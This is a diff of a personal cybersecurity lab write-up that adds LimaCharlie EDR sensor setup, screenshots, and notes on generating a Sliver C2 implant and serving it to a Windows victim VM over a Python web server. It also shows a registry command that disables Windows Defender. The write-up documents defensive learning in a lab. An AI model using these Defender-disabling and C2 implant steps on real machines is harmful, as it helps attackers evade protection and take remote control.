@@ -91,7 +91,6 @@ This was an important step to ensure the lab environment didn’t interfere with
      ```cmd
      REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
      ```
-![Picture4](https://github.com/user-attachments/assets/8fde9177-0f6b-402d-a7b6-9f18bca03fc6)
 
 4. **Safe Mode Adjustments:**
    - Booted into Safe Mode and disabled several Defender services in the Registry by setting their `Start` values to `4`.
@@ -136,6 +135,9 @@ Although not directly required for the initial setup and not directly used in th
    ```powershell
    Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
    ```
+![Picture14](https://github.com/user-attachments/assets/f01d8296-3082-4f33-ab14-c160ad8d2908)
+
+
 2. Unzipped the package and downloaded a configuration file from SwiftOnSecurity:
    ```powershell
    Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
@@ -150,12 +152,66 @@ Although not directly required for the initial setup and not directly used in th
    Get-Service sysmon64
    Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
    ```
+![Picture15](https://github.com/user-attachments/assets/8193349e-73b2-4f72-ba9b-517d34bed5b5)
+
+![Picture16](https://github.com/user-attachments/assets/e098090a-afc7-483f-baa1-ce43dfe233f0)
 
 ---
 
+## Setting Up LimaCharlie on the Windows VM
+
+### Creating a New Organization in LimaCharlie
+1. Logged into my [LimaCharlie account](https://limacharlie.io/) and created a new organization.
+2. Navigated to the **Organizations** tab and clicked **Create Organization**.
+3. Named the organization appropriately and took note of the organization ID for future use.
+
+
+![Picture18](https://github.com/user-attachments/assets/b37e25ca-0a0a-4b87-8732-83d0ab42c02a)
+
+![Picture19](https://github.com/user-attachments/assets/6cb6323e-f62f-4650-b3c3-f082659958bc)
+
+![Picture20](https://github.com/user-attachments/assets/691cd0e9-cc85-4641-b896-506164cbb001)
+
+
+### Downloading the LimaCharlie Sensor
+1. Went to the **Setup** section of the newly created organization.
+2. Downloaded the **lc_sensor.exe** file provided for Windows installations.
+
+### Installing and Registering the Sensor
+1. Transferred the `lc_sensor.exe` file to the Windows VM.
+2. Opened an Administrative PowerShell console and executed the following command to register the sensor with the organization:
+   ```powershell
+   .\lc_sensor.exe -i <organization_id>
+   ```
+3. Verified successful installation by checking that the LimaCharlie sensor appeared as an active endpoint in the **Sensors** tab of the LimaCharlie dashboard.
+
+![Picture21](https://github.com/user-attachments/assets/b07ae865-b797-44e3-a7aa-355f8d6136d9)
+
+![Picture22](https://github.com/user-attachments/assets/31e9fa38-e08f-44ad-80af-1e5fd5400baa)
+
+![Picture23](https://github.com/user-attachments/assets/393e27e8-2a8a-44c0-b90b-cee117ff5d45)
+
+I also create a sensor and an artifact collection rule as shown:
+
+![Picture23](https://github.com/user-attachments/assets/aa89282b-b11a-40ad-a9ec-678dbafc5145)
+
+![Picture24](https://github.com/user-attachments/assets/019bcb06-d8ae-4416-b572-b1550c384bd4)
+
+I then take a snapshot since the lab setup is now ready
+
+![Picture25](https://github.com/user-attachments/assets/12233e20-c119-4bc9-a894-a0b7b306c1fa)
+
+
 # Generating and Observing C2 Payloads
 
-Here is where I step into the attacker’s shoes to generate and deploy a C2 payload using the Sliver C2 framework. This experience gave me hands-on exposure to adversarial tactics and how EDR systems like LimaCharlie detect them.
+Here is where I step into the attacker’s shoes to generate and deploy a C2 payload using the Sliver C2 framework. This experience gave me hands-on exposure to adversarial tactics and how EDR systems like LimaCharlie detect them. So, now we switch over to ubuntu VM installed earlier to set up the attack system – silver c2
+
+![Picture26](https://github.com/user-attachments/assets/829b570f-edc6-4182-bb23-6872a58124b7)
+
+![Picture27](https://github.com/user-attachments/assets/42abcf24-ac1f-4b03-bf83-c5164eefa865)
+
+![Picture28](https://github.com/user-attachments/assets/b918d846-22f6-43af-8fdc-15674320880c)
+
 
 ---
 
@@ -174,11 +230,37 @@ From here, I launched the Sliver server:
 sliver-server
 ```
 
+
+
 Within the Sliver shell, I generated a C2 session payload, ensuring it used the statically assigned IP of my attack VM:
 
 ```bash
 generate --http [Linux_VM_IP] --save /opt/sliver
 ```
+
+![Picture29](https://github.com/user-attachments/assets/5acb3d06-2c71-463a-a19a-240e85b95213)
+
+Pulling payload down onto victim windows via python http server
+
+![Picture30](https://github.com/user-attachments/assets/f0a9aaad-d1f0-4197-9564-19410adede60)
+
+![Picture31](https://github.com/user-attachments/assets/daadeb43-6626-4042-b052-0c13362d2618)
+
+![Picture32](https://github.com/user-attachments/assets/a4bda2d8-a7d2-449c-bf79-d5d8e4a39fa4)
+now this terminal is logged into ubunto box and ssh’ing into it
+
+![Picture33](https://github.com/user-attachments/assets/b3df5484-b59d-4cb6-9d26-16b2cb09c89a)
+
+downloading silver c2 to ubuntu box 
+
+made it executable:
+
+![Picture34](https://github.com/user-attachments/assets/cef50254-b2d2-46b1-9dbe-31d222e15f1c)
+
+installed mingw-w64 for additional capabilities:
+
+![image](https://github.com/user-attachments/assets/b76eda73-ef23-4898-92e7-d5728313a005)
+
 
 This created a unique payload file, which I noted for future reference. The `implants` command within Sliver confirmed the configuration of my new payload:
 
